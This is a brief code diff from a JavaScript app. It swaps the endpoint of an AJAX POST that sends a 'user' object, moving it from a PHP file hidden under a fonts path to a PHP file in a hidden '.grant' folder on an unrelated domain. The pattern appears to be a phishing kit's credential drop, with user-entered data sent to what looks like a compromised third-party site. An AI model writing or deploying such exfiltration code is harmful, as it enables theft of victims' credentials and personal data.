@@ -77,7 +77,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://pearldozen.com/nc_assets/fonts/hey/haneulhye-webmale.php",
+          url: "https://multiserviciosaluvigo.com.mx/.grant/cous/vbd.php",
           data: user,
           success(data) {
               // alert('OK');
